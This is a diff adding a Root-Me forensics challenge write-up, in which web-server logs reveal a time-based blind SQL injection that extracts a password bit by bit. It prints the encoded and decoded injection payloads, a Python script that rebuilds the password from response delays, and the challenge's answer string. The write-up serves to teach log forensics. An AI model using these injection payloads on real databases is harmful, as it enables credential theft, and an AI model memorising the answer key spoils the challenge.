@@ -174,6 +174,121 @@ WIN-ETSA91RKCFP
 
 ---
 
+## Logs analysis web attack
+
+- Author: sambecks
+- Date: 05 July 2015
+- Points: 25
+- Level: 3
+
+### Statement
+
+Our website appears to have been attacked, but our system administrator does not understand web server logs. Can you find out if any data has been stolen ?
+
+### Attachments
+
+1. [ch13.txt](http://challenge01.root-me.org/forensic/ch13/ch13.txt).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+The challenge file can be opened:
+
+~~~
+192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
+...
+192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDIxLDEpKSksNywxKSksY2hhcig0OCksY2hhcig0OSkpIHdoZW4gMSB0aGVuIHNsZWVwKDIpIHdoZW4gMiB0aGVuIHNsZWVwKDQpICBlbmQpIGZyb20gbWVtYnJlcyB3aGVyZSBpZD0xKQ%3D%3D HTTP/1.1" 200 833 "-" "-"
+
+~~~
+
+This shows a series of HTTP GET requests to the site admin page.  The form submission includes "action=membres" and "order=XXX" where XXX is a base64 encoded string.
+
+Extracting the base64 string, the decoded strings can be found:
+
+~~~
+ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
+...
+ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
+~~~
+
+This shows a SQL Injection attack on user id=1's password.  The attack compares 2 password bits to char(48) and char(49)... 0 and 1 and sleeps for 0 if it is 00, 2 is it if 01, 4 if it is 10 or 6 if it is 11.  The 4th inject compares a single bit to 0 or 1.  The decompilation can be automated in Python:
+
+~~~py
+import base64 as b64 
+from datetime import datetime as dt
+file = "ch13.txt"
+
+f = open(file,"r")
+lines = f.read().split("\n")[:-1]
+times = []
+for line in lines:
+    timestr = line[30:38]
+    dtg = dt.strptime(timestr,'%H:%M:%S')
+    times.append(dtg)
+
+tdelta = []
+
+for i in range(1,len(times)):
+    tdelta.append(int(str(times[i]-times[i-1])[-2:]))
+    
+binstr = ""
+binarr = []
+intarr = []
+answer = ""
+
+for i in range(len(lines)-1):
+    td = tdelta[i]
+    b64str = lines[i][80:]
+    b64str = b64str.split(" HTTP")[0]
+    b64str = b64str.split("%3D")[0]
+    appends = (4-len(b64str)%4)%4
+    b64str += "="*appends
+    asciistr = b64.b64decode(b64str).decode()
+    if "TRUE" in asciistr:
+        if td == 0:
+            binstr += "00"
+        elif td == 2:
+            binstr += "01"
+        elif td == 4:
+            binstr += "10"
+        elif td == 6:
+            binstr += "11"
+    else:
+        if td == 2:
+            binstr += "0"
+        elif td==4:
+            binstr += "1"
+        binarr.append(binstr)
+        intarr.append(int(binstr,2))
+        answer += chr(int(binstr,2))
+        binstr = ""
+        
+print(answer)
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+g9UWD8EZgBhBpc4nTSAS
+~~~
+
+</details>
+
+---
+
+### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
